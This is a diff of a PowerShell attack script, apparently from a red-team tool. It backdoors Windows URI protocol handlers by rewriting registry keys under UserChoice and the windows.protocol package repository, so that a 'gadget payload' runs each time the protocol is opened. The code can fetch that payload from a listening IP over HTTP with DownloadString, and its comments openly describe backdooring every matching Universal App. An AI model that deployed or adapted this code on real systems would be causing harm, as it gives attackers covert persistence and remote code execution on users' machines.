@@ -26,7 +26,10 @@ Begin {
 }
 
 Process {
+    $proxySymbol = if ($proxyRequest) { "%1 %*" } else { "" }
+
     $payloadsDetails | ForEach-Object {
+        $uriProtocol = $_.UriProtocol;
         $gadgetPayload = If ($isOnlineFetch)
         {
             (New-Object net.webclient).DownloadString("http://" + $listeningIp + ":" + $httpPort + "/" + $_.UniqueID)
@@ -35,32 +38,23 @@ Process {
         {
             $_.PayloadContent
         }
-        $uriProtocol = $_.UriProtocol; $cmdSeparator = If ($gadgetPayload -match "powershell")
-        {
-            ";"
-        }
-        Else
-        {
-            "&"
-        }
+        $cmdSeparator = If ($gadgetPayload.StartsWith("powershell")) { ";" } Else { "&" }
 
         try # check if user has already chosen a default Universal App handler for the defined URI scheme via 'UserChoice' key lookup
         {
             $appxID = $( Get-ItemProperty -Path "HKCU:\\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\$uriProtocol\UserChoice" -Name "ProgID" -ErrorAction Stop ).ProgId
-            # get absolute pathname of the binary of the Universal App (via lookup in HKLM and as fallback in HKEY_CURRENT_USER
-            $binPathDefaultHandler = $( Get-ItemProperty -Path "HKLM:\\SOFTWARE\Classes\$appxID\shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue )."(default)"
-            if ( [string]::IsNullOrEmpty($binPathDefaultHandler))
+
+            # get pathname of the binary of the Universal App (via lookup in HKLM and as fallback in HKEY_CURRENT_USER)
+            $AppUserModelID = (Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Application" -ErrorAction SilentlyContinue).AppUserModelID
+            if ( [string]::IsNullOrEmpty($AppUserModelID))
             {
-                $binPathDefaultHandler = $( Get-ItemProperty -Path "HKCU:\\SOFTWARE\Classes\$appxID\shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue )."(default)"
+                $AppUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
             }
-            UpdateRegistryKey($gadgetPayload, $cmdSeparator, $binPathDefaultHandler)
+
+            UpdateRegistryKey($gadgetPayload, $cmdSeparator, ("cmd.exe /c start shell:Appsfolder\$AppUserModelID $proxySymbol"))
         }
         catch # if no explicit default app has been chosen, then lookup via 'windows.protocol' and backdoor all the Universal App IDs available for the defined URI protocol
         {
-            if ($proxyRequest)
-            {
-                $proxySymbol = "%1"
-            }
             New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
             Set-Location "HKCR:Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction SilentlyContinue
             $appxIDs = $( Get-ChildItem . ).PSChildName
@@ -72,7 +66,7 @@ Process {
                     try
                     {
                         $AppUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
-                        UpdateRegistryKey($gadgetPayload, $cmdSeparator, "cmd.exe /c start shell:Appsfolder\$AppUserModelID $proxySymbol %*")
+                        UpdateRegistryKey($gadgetPayload, $cmdSeparator, ("cmd.exe /c start shell:Appsfolder\$AppUserModelID $proxySymbol"))
                     }
                     catch # if key does not exists yet, create it
                     {
